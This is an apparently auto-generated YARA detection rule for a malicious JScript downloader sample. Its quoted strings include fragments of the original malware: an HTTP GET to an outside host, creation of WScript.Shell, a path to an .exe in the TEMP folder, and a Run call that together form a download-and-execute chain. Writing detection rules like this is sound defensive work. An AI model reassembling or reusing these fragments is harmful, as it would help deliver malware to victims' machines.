rule sig_20160330_5d3def2b27bd2cc3322e57950463eaec {
  meta:
    description = "datamaliciousorder - file 20160330_5d3def2b27bd2cc3322e57950463eaec.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3b6b2f477980744461887933ce2cf223685cea115003a2f3d2e0f93917ba744d"

  strings:
    $s1  = "_IQ[_PH](\"GET\", \"http://rocketsrange.com/b5ksa\", false);" fullword ascii
    $s2  = "function _Z(_N, _O0){_C = _C * 1; return _N - _O0;};" fullword ascii
    $s3  = "var _E = function _D0() {return WScript[_WR](\"WScript\"+\".Shell\");}(), _ZC = 11;" fullword ascii
    $s4  = "if (_IQ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _GG() {return _E[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5J0OIXQ1Z.ex\" + \"e\";};" fullword ascii
    $s6  = "function _H(){return _Z0 + \"\";};" fullword ascii
    $s7  = "function _DD(_GY){_E[\"Run\"](_GY, _C, _C);};" fullword ascii
    $s8  = "function _O() {return ((_DN == true) && (_DN == _A)) ? 1 : _C;};" fullword ascii
    $s9  = "function _GC()" fullword ascii
    $s10 = "var _UQ = new this[\"Date\"]();" fullword ascii
    $s11 = "function _OO(){return _WR;};" fullword ascii
    $s12 = "function _D(_U) {var _HY = (1, 2, 3, 4, 5, _U); return _HY;};" fullword ascii
    $s13 = " while (_V){" fullword ascii
    $s14 = "return _Z(_LS, _Y);" fullword ascii
    $s15 = "function _RQ(){return 22;};" fullword ascii
    $s16 = "var _A = false;" fullword ascii
    $s17 = "_A = true; " fullword ascii
    $s18 = "var _S = false;" fullword ascii
    $s19 = "var _DN = false;" fullword ascii
    $s20 = "_DN = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}